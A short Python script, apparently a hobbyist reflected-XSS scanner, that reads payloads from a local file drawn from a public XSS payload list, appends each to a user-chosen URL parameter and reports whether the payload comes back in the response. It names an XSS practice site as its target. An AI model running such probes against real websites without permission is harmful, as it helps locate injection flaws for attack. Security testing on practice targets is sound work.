# Payload source : https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt
# Website : https://xss-game.appspot.com/level1/frame?query=

##### Tasks #####
# add user agent specification
# add output to csv
# try contact url before requests

import requests

def LoadPayloads():
    file = open('payloads.txt', 'rb')
    payloads = file.readlines()
    file.close()
    return payloads

def TestPayloads(payloads, target, parameter):
    session = requests.session()
    """mobile_agent = ('Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 '
                        'Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) '
                        'Version/4.0 Mobile Safari/534.30')
    session.headers.update({'User-Agent': mobile_agent,
                                'X-RestLi-Protocol-Version': '2.0.0'})"""
    for payload in payloads:
        payload = payload.decode("utf-8").replace('\n','')
        payload_url = target+'?'+parameter+'='+payload
        response = session.get(payload_url)
        if str(payload) in response.text:
            print(f'Parameter "{parameter}" might be injectable with payload : "{payload}".')
        else:
            print(f'Parameter "{parameter}" might not be injectable.')

if __name__ == "__main__":
    payloads = LoadPayloads()

    url = input('Wich URL shall we try to inject ? :\n')
    parameter = input('Wich URL parameter shall we try to inject ? :\n')
    TestPayloads(payloads, url, parameter)